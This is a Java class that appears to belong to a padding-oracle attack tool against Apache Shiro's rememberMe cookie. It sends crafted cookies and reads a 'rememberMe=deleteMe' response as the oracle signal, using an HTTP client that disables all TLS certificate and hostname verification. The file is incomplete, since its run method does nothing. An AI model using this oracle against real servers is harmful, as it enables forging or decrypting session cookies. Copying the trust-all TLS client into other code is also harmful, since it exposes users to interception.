package com.longofo;

import org.apache.http.Header;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.security.cert.X509Certificate;

public class SendRequestThread extends Thread {
    private String url;
    private String rememberMe;

    public SendRequestThread(String url, String rememberMe) {
        this.url = url;
        this.rememberMe = rememberMe;
    }

    public String getRememberMe() {
        return rememberMe;
    }

    public void setRememberMe(String rememberMe) {
        this.rememberMe = rememberMe;
    }

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    @Override
    public void run() {
        super.run();
    }

    private boolean checkPaddingAttackRequest(String url, String rememberMe) throws IOException {

//        CloseableHttpClient httpClient = HttpClients.createDefault();
        CloseableHttpClient httpClient = getSkipHttpsVerifyHttpClient();
        HttpGet httpGet = new HttpGet(url);
        CloseableHttpResponse response = null;
        boolean success = true;

        httpGet.addHeader("User-Agent", "Mozilla/5.0");
        httpGet.addHeader("Referer", url);
        httpGet.addHeader("Cookie", String.format("rememberMe=%s", rememberMe));

        try {
            response = httpClient.execute(httpGet);
//            this.requestCount += 1;
            Header[] headers = response.getAllHeaders();
            if (response.getStatusLine().getStatusCode() == 200) {
                for (Header header : headers) {
                    if (header.getName().equals("Set-Cookie") && header.getValue().contains("rememberMe=deleteMe"))
                        success = false;
                }
            }
        } catch (IOException e) {
            System.out.println("Request error when checkPaddingAttackRequest" + e.getMessage());
        } finally {
            if (response != null) response.close();
            httpClient.close();
        }
        return success;
    }

    /**
     * 获取跳过 HTTPS 验证的 HTTPClient
     */
    private CloseableHttpClient getSkipHttpsVerifyHttpClient() {
        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            X509TrustManager tm = new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(X509Certificate[] arg0,
                                               String arg1) {
                }

                public void checkServerTrusted(X509Certificate[] arg0,
                                               String arg1) {
                }
            };
            ctx.init(null, new TrustManager[]{tm}, null);
            SSLConnectionSocketFactory ssf = new SSLConnectionSocketFactory(
                    ctx, NoopHostnameVerifier.INSTANCE);
            return HttpClients.custom()
                    .setSSLSocketFactory(ssf).build();
        } catch (Exception e) {
            e.printStackTrace();
            return HttpClients.createDefault();
        }
    }
}
